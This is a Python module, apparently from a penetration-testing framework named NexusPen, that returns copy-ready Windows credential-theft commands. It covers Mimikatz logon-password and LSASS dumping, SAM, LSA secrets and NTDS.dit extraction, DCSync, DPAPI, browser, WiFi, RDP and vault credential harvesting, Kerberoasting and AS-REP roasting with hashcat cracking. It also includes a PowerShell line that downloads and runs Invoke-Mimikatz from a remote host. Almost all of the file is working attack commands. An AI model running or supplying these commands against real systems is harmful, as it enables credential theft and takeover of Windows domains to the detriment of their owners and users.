#!/usr/bin/env python3
"""
NexusPen - Windows Credential Access Module
=============================================
Windows credential extraction and manipulation.
"""

import subprocess
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class ExtractedCredential:
    """Extracted credential."""
    username: str
    credential_type: str
    value: str
    source: str
    domain: Optional[str] = None


class Mimikatz:
    """
    Mimikatz module for credential extraction.
    """
    
    @staticmethod
    def sekurlsa_logonpasswords() -> str:
        """Extract logon passwords."""
        return '''
# Mimikatz - Dump logon passwords
privilege::debug
sekurlsa::logonpasswords

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# PowerShell (Invoke-Mimikatz)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
'''
    
    @staticmethod
    def sekurlsa_wdigest() -> str:
        """Extract WDigest credentials."""
        return '''
# Enable WDigest (for future logins)
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Force user to re-authenticate (lock workstation)
rundll32.exe user32.dll,LockWorkStation

# Then extract
sekurlsa::wdigest
'''
    
    @staticmethod
    def sekurlsa_ekeys() -> str:
        """Extract Kerberos encryption keys."""
        return '''
# Extract encryption keys
privilege::debug
sekurlsa::ekeys

# Use for Overpass-the-Hash
'''
    
    @staticmethod
    def lsadump_sam() -> str:
        """Dump local SAM database."""
        return '''
# Dump SAM (requires SYSTEM)
privilege::debug
token::elevate
lsadump::sam

# Offline from backup
lsadump::sam /system:SYSTEM /sam:SAM
'''
    
    @staticmethod
    def lsadump_secrets() -> str:
        """Dump LSA secrets."""
        return '''
# Dump LSA secrets (service account passwords, etc.)
privilege::debug
token::elevate
lsadump::secrets
'''
    
    @staticmethod
    def lsadump_dcsync(domain: str, user: str = 'krbtgt') -> str:
        """DCSync attack."""
        return f'''
# DCSync - replicate AD data (requires replication rights)
lsadump::dcsync /domain:{domain} /user:{user}

# All users
lsadump::dcsync /domain:{domain} /all /csv

# Specific account
lsadump::dcsync /domain:{domain} /user:Administrator
'''
    
    @staticmethod
    def kerberos_list() -> str:
        """List Kerberos tickets."""
        return '''
# List tickets
kerberos::list

# Export tickets
kerberos::list /export

# Purge tickets
kerberos::purge
'''
    
    @staticmethod
    def dpapi_cred() -> str:
        """Decrypt DPAPI credentials."""
        return '''
# List DPAPI blobs
dpapi::cred /in:"%APPDATA%\\Microsoft\\Credentials\\*"

# Decrypt with master key
dpapi::cred /in:blob.cred /masterkey:KEY

# Get master keys
sekurlsa::dpapi
'''


class LaZagne:
    """
    LaZagne credential extraction.
    """
    
    @staticmethod
    def run_all() -> str:
        """Run all LaZagne modules."""
        return '''
# Extract all credentials
python laZagne.py all

# Specific modules
python laZagne.py browsers
python laZagne.py wifi
python laZagne.py databases
python laZagne.py mails
python laZagne.py sysadmin
python laZagne.py windows

# Write to file
python laZagne.py all -oN
'''
    
    @staticmethod
    def get_browsers() -> str:
        """Extract browser credentials."""
        return '''
# Chrome, Firefox, Edge, IE credentials
python laZagne.py browsers

# Manual Chrome extraction
# Cookies: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies
# Login Data: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data
# Key in Local State file
'''


class WindowsCredentialExtractor:
    """
    Windows credential extraction utilities.
    """
    
    def __init__(self):
        self.credentials: List[ExtractedCredential] = []
    
    def dump_lsass_procdump(self, output_path: str = 'lsass.dmp') -> str:
        """Dump LSASS with ProcDump."""
        cmd = f'''
# Download ProcDump from Sysinternals
# Dump LSASS (requires admin)
procdump.exe -accepteula -ma lsass.exe {output_path}

# Analyze offline with Mimikatz
sekurlsa::minidump {output_path}
sekurlsa::logonpasswords
'''
        return cmd
    
    def dump_lsass_comsvcs(self, output_path: str = 'lsass.dmp') -> str:
        """Dump LSASS with comsvcs.dll (LOLBin)."""
        cmd = f'''
# Get LSASS PID
tasklist /fi "imagename eq lsass.exe"

# Dump using comsvcs.dll MiniDump
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] {output_path} full

# PowerShell
$lsass = Get-Process lsass
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass.Id {output_path} full
'''
        return cmd
    
    def dump_sam_registry(self) -> str:
        """Dump SAM, SYSTEM, SECURITY from registry."""
        return '''
# Save registry hives (requires admin)
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save
reg save HKLM\\SECURITY security.save

# Extract with Impacket
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# Or mimikatz
lsadump::sam /system:system.save /sam:sam.save
'''
    
    def dump_ntds(self, dc_ip: str = None) -> str:
        """Dump NTDS.dit."""
        return f'''
# Using VSS (on DC)
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.bak
vssadmin delete shadows /shadow=[ID]

# Using DCSync (remote)
secretsdump.py domain/user:password@{dc_ip or "DC_IP"} -just-dc

# Using ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\\temp\\ntds" q q
'''
    
    def dump_cached_credentials(self) -> str:
        """Dump cached domain credentials."""
        return '''
# Mimikatz
lsadump::cache

# Impacket (from registry)
secretsdump.py -cached LOCAL

# Cached credentials are MSCash2 hashes
# Can be cracked with hashcat mode 2100
'''
    
    def extract_wifi_passwords(self) -> str:
        """Extract WiFi passwords."""
        return r'''
# List saved WiFi profiles
netsh wlan show profiles

# Get password for specific profile
netsh wlan show profile name="SSID" key=clear

# Get all WiFi passwords
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

# PowerShell
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Profile=$name;Password=$pass }}
'''
    
    def extract_rdp_credentials(self) -> str:
        """Extract saved RDP credentials."""
        return '''
# List saved RDP connections
reg query "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers"

# Default.rdp location
dir /b /s default.rdp

# Decrypt with Mimikatz DPAPI
dpapi::rdp /in:"%USERPROFILE%\\Documents\\Default.rdp"

# Get RDP Cached credentials
cmdkey /list
'''
    
    def extract_autologon(self) -> str:
        """Extract AutoLogon credentials."""
        return '''
# Check registry
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName

# PowerShell
$key = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
Get-ItemProperty $key | Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
'''
    
    def extract_vault_credentials(self) -> str:
        """Extract Windows Vault credentials."""
        return '''
# List vaults
vaultcmd /list

# List credentials
vaultcmd /listcreds:"Web Credentials" /all
vaultcmd /listcreds:"Windows Credentials" /all

# PowerShell enumeration
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()
'''
    
    def extract_browser_passwords(self) -> str:
        """Extract browser passwords."""
        return '''
# Chrome passwords database
%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data

# Edge
%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data

# Firefox
%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json
%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\key4.db

# Use SharpChrome or LaZagne for decryption
SharpChrome.exe logins
python laZagne.py browsers
'''


class Kerberoast:
    """
    Kerberoasting attacks.
    """
    
    @staticmethod
    def get_spns() -> str:
        """Get SPNs for Kerberoasting."""
        return '''
# PowerShell
setspn -T domain.local -Q */*

# PowerView
Get-DomainUser -SPN

# ldapsearch
ldapsearch -x -H ldap://DC -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
'''
    
    @staticmethod
    def rubeus_kerberoast() -> str:
        """Kerberoast with Rubeus."""
        return '''
# Request TGS for all SPNs
Rubeus.exe kerberoast /outfile:hashes.txt

# Specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# With specific format
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
'''
    
    @staticmethod
    def impacket_kerberoast() -> str:
        """Kerberoast with Impacket."""
        return '''
# GetUserSPNs
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -outputfile hashes.txt

# Request specific SPN
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request-user svc_sql
'''
    
    @staticmethod
    def crack_tgs() -> str:
        """Crack TGS tickets."""
        return '''
# Hashcat (mode 13100 for Kerberos 5 TGS-REP)
hashcat -m 13100 hashes.txt /path/to/wordlist.txt

# John
john --format=krb5tgs hashes.txt --wordlist=/path/to/wordlist.txt
'''


class ASREPRoast:
    """
    AS-REP Roasting attacks.
    """
    
    @staticmethod
    def find_no_preauth() -> str:
        """Find users without Kerberos pre-authentication."""
        return '''
# PowerView
Get-DomainUser -PreauthNotRequired

# ldapsearch
ldapsearch -x -H ldap://DC -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# BloodHound query
MATCH (u:User {dontreqpreauth: true}) RETURN u.name
'''
    
    @staticmethod
    def rubeus_asreproast() -> str:
        """AS-REP Roast with Rubeus."""
        return '''
# Get AS-REP hashes
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Specific user
Rubeus.exe asreproast /user:target_user /format:hashcat
'''
    
    @staticmethod
    def impacket_asreproast() -> str:
        """AS-REP Roast with Impacket."""
        return '''
# GetNPUsers
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# With credentials
GetNPUsers.py domain.local/user:password -dc-ip DC_IP
'''
    
    @staticmethod
    def crack_asrep() -> str:
        """Crack AS-REP hashes."""
        return '''
# Hashcat (mode 18200)
hashcat -m 18200 asrep.txt /path/to/wordlist.txt

# John
john --format=krb5asrep asrep.txt --wordlist=/path/to/wordlist.txt
'''
